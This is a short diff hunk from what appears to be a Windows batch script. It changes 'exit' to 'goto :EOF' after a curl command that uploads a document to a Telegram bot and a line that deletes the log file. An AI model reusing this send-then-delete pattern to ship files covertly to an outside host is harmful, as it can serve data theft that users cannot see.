@@ -103,7 +103,7 @@ curl -s -X POST "https://api.telegram.org/bot%TOKEN_RUNNING%/sendDocument" ^
 
 
 del /f /q "%LOGFILE%"
-exit
+goto :EOF
 
 
 
